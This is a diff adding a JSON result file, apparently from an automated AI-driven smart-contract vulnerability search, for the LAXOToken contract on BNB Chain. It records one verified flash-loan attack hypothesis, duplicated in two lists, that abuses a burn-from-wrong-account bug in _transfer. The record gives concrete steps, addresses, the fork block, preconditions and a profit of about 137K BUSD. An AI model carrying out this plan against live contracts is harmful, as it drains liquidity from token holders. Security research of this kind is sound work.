@@ -1,0 +1,171 @@
+{
+  "case_id": "big_laxo_full",
+  "mode": "claude-cli",
+  "model": null,
+  "stub": false,
+  "tool_calls": 11,
+  "turns": 11,
+  "hypotheses": [
+    {
+      "id": "big_laxo_full-1-pair-burn-desync",
+      "vuln_class": "invariant_break_other",
+      "target": {
+        "contract": "LAXOToken",
+        "function": "_transfer(address,address,uint256)",
+        "file": "src/contracts/LAXOToken.sol",
+        "lines": "L98-L123"
+      },
+      "initial_state": {
+        "fork": {
+          "chain": "bsc",
+          "block": 82730141,
+          "rpc": "https://bsc-dataseed.binance.org"
+        },
+        "actors": [
+          {
+            "name": "attacker",
+            "role": "attacker",
+            "starting_balance_wei": "100000000000000",
+            "starting_tokens": [
+              {
+                "token": "LAXO",
+                "amount": "1000000000000000000"
+              }
+            ]
+          }
+        ],
+        "deployments": [
+          "addr:0x62951CaD7659393BF07fbe790cF898A3B6d317CB",
+          "addr:0xF05a6361e6F851BbFf39C4f1d9aD4b661d3180B3",
+          "addr:0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb"
+        ]
+      },
+      "pre_vuln_state": {
+        "assertions": [
+          "IUniswapV2Pair(busd_pair).getReserves() returns reserves matching pair balance pre-attack",
+          "MAX_SELL_BURN > balanceOf[DEAD] (sell burn still active)"
+        ],
+        "setup_calls": [
+          "pancakeV3.flash(attacker, 350000e18 BUSD, 0, ...)",
+          "router.swapExactTokensForTokensSupportingFeeOnTransferTokens(350000e18 BUSD -> LAXO via busd_pair, to=router)",
+          "router.addLiquidityETH{value: bnb}(LAXO, 10000, ..., to=attacker)",
+          "router.removeLiquidityETHSupportingFeeOnTransferTokens(LAXO, 100000, ..., to=attacker)"
+        ]
+      },
+      "post_vuln_state": {
+        "class_invariant": "victim_token_drained",
+        "custom_assertion": "BUSD.balanceOf(attacker) - flashLoanRepayment >= 100_000e18",
+        "min_profit_wei": "100000000000000000000000"
+      },
+      "invariant": {
+        "halmos_check": false,
+        "property_function": "check_pair_balance_eq_reserves"
+      },
+      "attack_steps": [
+        "Flash loan 350K BUSD from PancakeSwap V3.",
+        "Swap BUSD -> LAXO via fee-on-transfer router using busd_pair so router holds LAXO.",
+        "Add LAXO/BNB liquidity to wbnb_pair, then remove tiny LP via FOT remove to launder LAXO into attacker's wallet.",
+        "Call laxo.transfer(busd_pair, laxo.balanceOf(busd_pair)). Recipient==pair triggers SELL path in LAXOToken._transfer.",
+        "In SELL path, sellFee (5%) is taken from sender (attacker), and actualBurn (~95% of amount) is super._transfer'd FROM busd_pair to DEAD (burn-from-wrong-account bug). pair.sync() then drops pair LAXO reserves to the post-burn balance. Finally super._transfer sends burnAmount from attacker to busd_pair, leaving pair LAXO BALANCE > reserves by the surplus.",
+        "Compute amountOut = router.getAmountOut(surplus, reserve_LAXO_post_sync, reserve_BUSD) and call busd_pair.swap(amountOut, 0, attacker, '') directly to extract BUSD using the unsynced surplus.",
+        "Repay flash loan and pocket ~137K BUSD profit."
+      ],
+      "preconditions": [
+        "buyEnabled == true and attacker has buyQuota for the initial BUSD->LAXO buy (or path uses excluded-from-fee actor for the buy step).",
+        "balanceOf[DEAD] < MAX_SELL_BURN so the actualBurn branch executes (otherwise the desync does not occur).",
+        "attacker holds enough LAXO to make laxo.transfer(busd_pair, pair_balance) succeed."
+      ],
+      "triage": {
+        "score": 0.95,
+        "duplicates": [
+          "2026-02__LAXO_Token_exp"
+        ],
+        "drop_reason": "",
+        "status": "verified"
+      }
+    }
+  ],
+  "verified": [
+    {
+      "id": "big_laxo_full-1-pair-burn-desync",
+      "vuln_class": "invariant_break_other",
+      "target": {
+        "contract": "LAXOToken",
+        "function": "_transfer(address,address,uint256)",
+        "file": "src/contracts/LAXOToken.sol",
+        "lines": "L98-L123"
+      },
+      "initial_state": {
+        "fork": {
+          "chain": "bsc",
+          "block": 82730141,
+          "rpc": "https://bsc-dataseed.binance.org"
+        },
+        "actors": [
+          {
+            "name": "attacker",
+            "role": "attacker",
+            "starting_balance_wei": "100000000000000",
+            "starting_tokens": [
+              {
+                "token": "LAXO",
+                "amount": "1000000000000000000"
+              }
+            ]
+          }
+        ],
+        "deployments": [
+          "addr:0x62951CaD7659393BF07fbe790cF898A3B6d317CB",
+          "addr:0xF05a6361e6F851BbFf39C4f1d9aD4b661d3180B3",
+          "addr:0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb"
+        ]
+      },
+      "pre_vuln_state": {
+        "assertions": [
+          "IUniswapV2Pair(busd_pair).getReserves() returns reserves matching pair balance pre-attack",
+          "MAX_SELL_BURN > balanceOf[DEAD] (sell burn still active)"
+        ],
+        "setup_calls": [
+          "pancakeV3.flash(attacker, 350000e18 BUSD, 0, ...)",
+          "router.swapExactTokensForTokensSupportingFeeOnTransferTokens(350000e18 BUSD -> LAXO via busd_pair, to=router)",
+          "router.addLiquidityETH{value: bnb}(LAXO, 10000, ..., to=attacker)",
+          "router.removeLiquidityETHSupportingFeeOnTransferTokens(LAXO, 100000, ..., to=attacker)"
+        ]
+      },
+      "post_vuln_state": {
+        "class_invariant": "victim_token_drained",
+        "custom_assertion": "BUSD.balanceOf(attacker) - flashLoanRepayment >= 100_000e18",
+        "min_profit_wei": "100000000000000000000000"
+      },
+      "invariant": {
+        "halmos_check": false,
+        "property_function": "check_pair_balance_eq_reserves"
+      },
+      "attack_steps": [
+        "Flash loan 350K BUSD from PancakeSwap V3.",
+        "Swap BUSD -> LAXO via fee-on-transfer router using busd_pair so router holds LAXO.",
+        "Add LAXO/BNB liquidity to wbnb_pair, then remove tiny LP via FOT remove to launder LAXO into attacker's wallet.",
+        "Call laxo.transfer(busd_pair, laxo.balanceOf(busd_pair)). Recipient==pair triggers SELL path in LAXOToken._transfer.",
+        "In SELL path, sellFee (5%) is taken from sender (attacker), and actualBurn (~95% of amount) is super._transfer'd FROM busd_pair to DEAD (burn-from-wrong-account bug). pair.sync() then drops pair LAXO reserves to the post-burn balance. Finally super._transfer sends burnAmount from attacker to busd_pair, leaving pair LAXO BALANCE > reserves by the surplus.",
+        "Compute amountOut = router.getAmountOut(surplus, reserve_LAXO_post_sync, reserve_BUSD) and call busd_pair.swap(amountOut, 0, attacker, '') directly to extract BUSD using the unsynced surplus.",
+        "Repay flash loan and pocket ~137K BUSD profit."
+      ],
+      "preconditions": [
+        "buyEnabled == true and attacker has buyQuota for the initial BUSD->LAXO buy (or path uses excluded-from-fee actor for the buy step).",
+        "balanceOf[DEAD] < MAX_SELL_BURN so the actualBurn branch executes (otherwise the desync does not occur).",
+        "attacker holds enough LAXO to make laxo.transfer(busd_pair, pair_balance) succeed."
+      ],
+      "triage": {
+        "score": 0.95,
+        "duplicates": [
+          "2026-02__LAXO_Token_exp"
+        ],
+        "drop_reason": "",
+        "status": "verified"
+      }
+    }
+  ],
+  "cost_usd": 0.9947217500000001,
+  "elapsed_sec": 245.308,
+  "exit_code": 0
+}
